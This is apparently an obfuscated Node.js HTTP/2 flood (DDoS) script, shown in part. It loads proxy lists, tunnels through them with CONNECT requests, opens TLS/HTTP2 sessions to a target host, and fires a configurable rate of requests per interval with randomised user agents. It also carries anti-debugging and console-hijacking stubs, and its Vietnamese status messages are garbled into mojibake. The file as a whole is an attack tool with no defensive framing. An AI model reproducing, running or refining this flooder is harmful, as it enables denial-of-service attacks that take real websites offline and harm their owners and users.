...
function readLines(_0x2ebd03) {
  const _0x5b4b07 = (function () {
      ...
      return function (_0x3d94b4, _0x263af4) {
        const _0x417ef6 = _0x3876e9
          ? function () {
              if (_0x263af4) {
                const _0xd4290d = _0x263af4.apply(_0x3d94b4, arguments)
                return (_0x263af4 = null), _0xd4290d
              }
            }
          : function () {}
        return (_0x3876e9 = false), _0x417ef6
      }
    })(),
    _0x88761 = _0x5b4b07(this, function () {
      return _0x88761
        .toString()
        .search('(((.+)+)+)+$')
        .toString()
        .constructor(_0x88761)
        .search('(((.+)+)+)+$')
    })
  _0x88761()
  const _0x3e7870 = (function () {
    ...
    return function (_0x295742, _0x1c2607) {
      const _0x1e8716 = _0x58d643
        ? function () {
            if (_0x1c2607) {
              const _0x485b4f = _0x1c2607.apply(_0x295742, arguments)
              return (_0x1c2607 = null), _0x485b4f
            }
          }
        : function () {}
      return (_0x58d643 = false), _0x1e8716
    }
  })()
  ;(function () {
    _0x3e7870(this, function () {
      const _0x5567b5 = new RegExp('function *\\( *\\)'),
        _0xac137d = new RegExp('\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)', 'i'),
        _0xf3b8bc = _0x5a3053('init')
      !_0x5567b5.test(_0xf3b8bc + 'chain') ||
      !_0xac137d.test(_0xf3b8bc + 'input')
        ? _0xf3b8bc('0')
        : _0x5a3053()
    })()
  })()
  const _0x3af3cb = (function () {
      ...
      return function (_0x275d0c, _0xf15222) {
        const _0x49f1dd = _0x396ba3
          ? function () {
              if (_0xf15222) {
                const _0x3a7378 = _0xf15222.apply(_0x275d0c, arguments)
                return (_0xf15222 = null), _0x3a7378
              }
            }
          : function () {}
        return (_0x396ba3 = false), _0x49f1dd
      }
    })(),
    _0x4398c6 = _0x3af3cb(this, function () {
      const _0x79314e = function () {
        ...
        _0xaf9435 = _0x79314e(),
        _0x161ca7 = (_0xaf9435.console = _0xaf9435.console || {}),
        _0x32eca2 = [
          'log',
          'warn',
          'info',
      ...
      for (let _0x228333 = 0; _0x228333 < _0x32eca2.length; _0x228333++) {
        const _0x2e0e86 = _0x3af3cb.constructor.prototype.bind(_0x3af3cb),
          _0x2a782b = _0x32eca2[_0x228333],
          _0x47f27c = _0x161ca7[_0x2a782b] || _0x2e0e86
  ...
  return (
    _0x4398c6(), fs.readFileSync(_0x2ebd03, 'utf-8').toString().split(/\r?\n/)
  )
}
...
function randomElement(_0x1ecb88) {
  return _0x1ecb88[randomIntn(0, _0x1ecb88.length)]
}
const args = {
...
blackList.includes(args.target) &&
  (console.log('Website NÃ y Náº±m Trong Danh SÃ¡ch Black List.'), process.exit(1))
;(args.time < 0 || args.time > 120) &&
  (console.log('Thá»i Gian Pháº£i Náº±m Trong Khoáº£ng Tá»« 0 Äáº¿n 120.'),
  process.exit(1))
;(args.Rate < 0 || args.Rate > 100) &&
  (console.log('Rate Pháº£i Náº±m Trong Khoáº£ng Tá»« 0 Äáº¿n 100.'), process.exit(1))
;(args.threads < 0 || args.threads > 10) &&
  (console.log('Sá»‘ Threads Pháº£i Náº±m Trong Khoáº£ng Tá»« 0 Äáº¿n 10.'),
  process.exit(1))
...
if (cluster.isMaster) {
  ...
  const targetHost = parsedTarget.host,
    targetPort = parsedTarget.protocol === 'https:' ? 443 : 80
...
class NetSocket {
  ...
  ['HTTP'](_0x4c4fe9, _0x5fd469) {
    const _0x4c67b2 = _0x4c4fe9.address.split(':'),
      _0x2724ec = _0x4c67b2[0],
      _0x534c69 =
        'CONNECT ' +
        _0x4c4fe9.address +
        ':443 HTTP/1.1\r\nHost: ' +
      ...
      _0x197c28 = new Buffer.from(_0x534c69),
      _0x4aa534 = net.connect({
        host: _0x4c4fe9.host,
        port: _0x4c4fe9.port,
        allowHalfOpen: true,
        writable: true,
    ...
    _0x4aa534.setTimeout(_0x4c4fe9.timeout * 10 * 10000)
    _0x4aa534.on('connect', () => {
      _0x4aa534.write(_0x197c28)
    })
    _0x4aa534.on('data', (_0x3208e0) => {
      const _0x3f5798 = _0x3208e0.toString('utf-8'),
        _0x45817a = _0x3f5798.includes('HTTP/1.1 200')
      if (_0x45817a === false) {
        return (
          _0x4aa534.destroy(),
          _0x5fd469(undefined, 'error: invalid response from proxy server')
        )
      }
    ...
    _0x4aa534.on('timeout', () => {
      return (
        _0x4aa534.destroy(), _0x5fd469(undefined, 'error: timeout exceeded')
      )
    })
  }
}
function getRandomUserAgent() {
  const _0x72afdd = [
    ...
    _0x5bfbf8 = ['Chrome', 'Firefox', 'Safari', 'Edge', 'Opera'],
    _0x5bbc35 = ['en-US', 'en-GB', 'fr-FR', 'de-DE', 'es-ES'],
    _0x4a79ef = ['US', 'GB', 'FR', 'DE', 'ES'],
    _0x36f434 = [
      'Windows',
      'Apple',
      'Google',
    ...
    _0x26953e = _0x72afdd[Math.floor(Math.random() * _0x72afdd.length)],
    _0x28b36d = _0x5bfbf8[Math.floor(Math.random() * _0x5bfbf8.length)],
    _0x919e74 = _0x5bbc35[Math.floor(Math.random() * _0x5bbc35.length)],
    _0x147541 = _0x4a79ef[Math.floor(Math.random() * _0x4a79ef.length)],
    _0x2047ac = _0x36f434[Math.floor(Math.random() * _0x36f434.length)],
    _0x15fde4 = Math.floor(Math.random() * 100) + 1,
    _0x5b3548 = Math.floor(Math.random() * 6) + 1,
    _0x5f3de7 =
      _0x2047ac +
      '/' +
      _0x28b36d +
      ...
      _0x919e74 +
      ')',
    _0x3cdcf3 = btoa(_0x5f3de7)
  let _0x404c55 = ''
  for (let _0x30f324 = 0; _0x30f324 < _0x3cdcf3.length; _0x30f324++) {
    _0x30f324 % _0x5b3548 === 0
...
function runFlooder() {
  const _0x3919a3 = randomElement(proxies),
    _0x47fa50 = _0x3919a3.split(':')
  ...
  Header.HTTP(_0x245bc2, (_0x41e820, _0x157876) => {
    ...
    _0x41e820.setKeepAlive(true, 60000)
    const _0x4c3f19 = {
        ALPNProtocols: [
          'h3',
          'h2',
      ...
      _0x4ad4ea = tls.connect(443, parsedTarget.host, _0x4c3f19)
    ...
    _0x35204b.on('connect', () => {
      const _0x2bcd62 = setInterval(() => {
        for (let _0x2f5ebc = 0; _0x2f5ebc < args.Rate; _0x2f5ebc++) {
          const _0x43400a = _0x35204b
            .request(headers)
            .on('response', (_0x15233e) => {
              _0x43400a.close()
              _0x43400a.destroy()
              return
            })
...
function _0x5a3053(_0x5b8494) {
  function _0x4f6337(_0x3071d8) {
    if (typeof _0x3071d8 === 'string') {
      return function (_0x1d1c93) {}
        .constructor('while (true) {}')
        .apply('counter')
    } else {
      ;('' + _0x3071d8 / _0x3071d8).length !== 1 || _0x3071d8 % 20 === 0
        ? function () {
            return true
          }
